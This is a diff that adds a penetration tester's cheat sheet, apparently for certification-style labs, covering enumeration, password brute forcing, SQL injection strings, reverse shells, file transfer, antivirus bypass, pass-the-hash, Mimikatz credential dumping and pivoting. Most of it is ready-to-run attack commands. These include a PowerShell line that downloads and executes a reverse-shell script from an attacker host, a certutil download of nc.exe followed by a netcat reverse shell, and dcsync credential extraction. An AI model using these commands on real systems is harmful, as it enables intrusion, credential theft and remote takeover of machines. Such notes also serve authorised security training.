@@ -1,0 +1,163 @@
+### VARIABLE SETTING
+export IP=<Target IP>
+	echo $IP
+export kali=<Kali's IP>
+	echo $kali
+
+### ENUMERATION
+Nmap scan of all ports:
+        sudo nmap -sS -p- -v $IP
+Detailed scan:
+        nmap -sT -A -vv -oN scan.txt $IP -p <ports>
+	sudo nmap -sV -sC -A -vv -oN vuln.txt $IP -p <ports>
+Web Directories:
+        gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -t 20 -x php,txt,zip,html -o dirscan.txt $IP
+	feroxbuster -u http://$IP/ -d <debth> -w /usr/share/seclists/Discovery/Web-Content/big.txt  -x php,html,txt,zip,asp,aspx,cgi -t 50 -o dirscan.txt
+		Other Uncommon web extensions: svc, js, net, jpg, png
+		Resume: feroxbuster --resume-from <state file>
+WpScan:
+        wpscan --url <wordpress site> -o wpScan.txt -t 20 -e ap,at,cb,dbe,u --detection-mode mixed/aggressive/passive -v
+Nikto:
+        nikto -h $IP -o nikto.txt
+Enum4linux:
+        enum4linux -a $IP > enum4linux.txt
+	~/Kali/Tools/enumeration/enum4linux-ng/enum4linux-ng.py -As -oJ enum4linux $IP
+Smb:
+	smbmap -H $IP -v
+	smbclient \\\\$IP\\<share> OR smbclient -L $IP (-U <user>, optional)
+	nmap -sT -A -vv -p 139,445 --script=smb-enum-users $IP
+Msrpc:
+	impacket-rpcdump -p <port> $IP (-hashes <NTLM> -> optional)
+NFS Share:
+	showmount -e $IP
+
+### BREAKING SERVICES/ BRUTEFORCE
+Cewl (creation of custom wordlist):
+	cewl -d (debth#) -m (min letter #) -w cewl.txt --with-numbers <URL>
+Crunch (modifying plain wordlist):
+	crunch (min#) (max#) 0123456789 -t <word>@@@ -o dict.txt (0-9 3 digits added to 'word')
+WpScan:
+        wpscan --url <wordpress site> -t 20 -U <username> -P /usr/share/wordlists/rockyou.txt -v
+SQLi:
+        a' or 1=1 -- -
+        a' union select 1,2,3,4,5,6-- -
+        cat /home/kali/Kali/Writeups/vulnhub/dc9.txt
+Hydra:
+        hydra -l <user> -P /usr/share/wordlists/rockyou.txt $IP <service>
+        hydra -l <user> -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong pass"
+Hashid:
+	hashid <hash file> -m -j
+John:
+        john --wordlist=/usr/share/wordlists/rockyou.txt <hash.txt>
+Hashcat:
+        hashcat -a 0 -m <mode#> <hash.txt> /usr/share/wordlists/rockyou.txt
+Ffuf:
+	ffuf -w /usr/share/wordlists/rockyou.txt -c -v -u "http://$IP/loginform.asp?uname=admin&psw=FUZZ" -fs <status code filter>
+
+### WORDLISTS
+Quick Passwords:
+	/usr/share/wordlists/fasttrack.txt
+	/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
+	/usr/share/seclists/Passwords/Common-Credentials/best1050.txt
+	/usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt
+Default/ Good Enough Passwords:
+	/usr/share/wordlists/rockyou.txt
+	/usr/share/wordlists/crackstation.txt
+
+### SHELLS
+SSH w/o host caching:
+	ssh <user>@$IP -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"
+Wordpress:
+        /usr/share/wordlists/SecLists/Web-Shells/WordPress/plugin-shell.php
+	pentest monkey -> phpReverseShell.php
+Generic one-liners:
+        https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+Stabalize shell:
+        Linux>
+                python3 -c 'import pty;pty.spawn("/bin/bash")'
+                export TERM=xterm + CRTL+Z
+                stty raw -echo; fg
+        Windows>
+                rlwrap nc -nvlp 4444
+Powercat (powershell netcat):
+	powercat -c $kali -p <port> -e cmd.exe -g > reverseshell.ps1
+Invoke-PowershellTcp (slower, but reliable):
+	(start apache web service)
+	powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://192.168.119.190/Invoke-PowerShellTcp.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress 192.168.119.190 -Port 4444"
+Netcat (Windows):
+	certutil.exe -urlcache -split -f http://192.168.119.128/ftphome/windowsTools/nc.exe C:\Windows\Temp\nc.exe
+	C:\Windows\Temp\nc.exe -e powershell.exe (or cmd.exe) 192.168.119.128 4444
+MSSQL (via sqsh):
+	sqsh -S $IP -U <user> -P <pass> -D <database, optional>
+SMB/ MSSQL PtH:
+	crackmapexec <service> $IP -u user -H <HASH>
+
+### KALI FILE TRANSFER SERVICES
+FTP:
+	sudo systemctl restart pure-ftpd
+	win> ftp <IP> (note: interactive)
+	ftp> binary
+Apache:
+	sudo service apache2 start
+Python Web Server:
+	python3 -m http.server 8000
+SMB Server (can also run binaries in share from MEMORY!):
+	kali> impacket-smbserver -smb2support <share name> `pwd`
+		Upload: copy <local binary> \\<Kali IP>\<share name>\
+		Download: copy \\<Kali IP>\<share name>\
+Scp:
+	scp (source)<user>@$IP:/path/to/binary (destination)<user>@$kali:/output/destination
+
+### COMPILING
+Linux binaries:
+	gcc <file.c> -o <output> (ideally compile on target host)
+Win64:
+	x86_64-w64-mingw32-gcc <file.cpp> -o <output.exe>
+Win32:
+	i686-w64-mingw32-gcc <file.cpp> -o <output.exe>
+Note:
+	-static may help for mismatched C libraries.
+Windows AV bypass compiling:
+	shellter -OR- veil
+
+### ACTIVE DIRECTORY/ WINDOWS
+Pass-the-Hash (local):
+	(mimikatz pass the hash, or grab SPN ticket)
+	PsExec.exe \\<hostname> cmd.exe (-u DOMAIN\User)
+Pass-the-Hash (remote):
+	pth-winexe -U <user>%<LM Hash>:<NTLM Hash> //<IP> cmd
+	xfreerdp /dynamic-resolution /clipboard /cert:ignore /v:$IP /u:<user> /pth:<NTLM>
+Bypass UAC:
+	Powershell Empire/ Metasploit modules/ SharpBypassUAC.exe
+Frameworks:
+	sudo su && powershell-empire server && powershell-empire client -OR- msfconsole
+AD Enumeration:
+	sudo neo4j console && bloodhound
+		win> powershell -ep Bypass && .\SharpHound.ps1 && Invoke-Bloodhound -CollectionMethod All -Domain <domain> -ZipFileName loot.zip
+	PowerView.ps1 && cat /home/kali/Kali/Tools/windows/powerViewCheatSheet
+RDP:
+	rdesktop $IP -u <user> -p <pass>
+
+### WINDOWS POST-EXPLOITATION
+Mimikatz (cred dump):
+	Privilege::Debug && lsadump::lsa /patch -OR- sekurlsa::logonpasswords -OR- lsadump::dcsync /domain:<domain> /all /csv
+Evil-WinRM (run code in memory, bypass ASLR):
+	evil-winrm -i $IP -u <user> -p <pass> -H <hash> -s /var/www/html/ftphome/powershellScripts/ (realistically this can be any directory you have powershell scripts in)
+	menu
+
+### PIVOTING/ PORT FORWARDING
+Linux- SSH:
+	specific port -> ssh -N -L 0.0.0.0:<local port>:<target IP>:<target port> username@<compromised IP>
+	dynamic via proxychains -> ssh -N -D 127.0.0.1:8888 username@$IP -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"
+	dynamic via sshuttle -> sshuttle -r username@$IP 0/0
+Windows- Plink:
+	specific port -> cmd.exe /c echo y | plink.exe -ssh -l kali -pw <pass> -R <kaliIP>:<kaliPort>:127.0.0.1:<localPort> <kali IP>
+
+### BUFFER OVERFLOW
+Use Immunity Debugger for windows (TheCyberMentor @ Youtube has a great guide)
+Use edb for linux.
+Note for testing on linux:
+	Turn off ASLR:
+		echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+	Enable bebugging/ coredumps:
+		ulimit -c unlimited
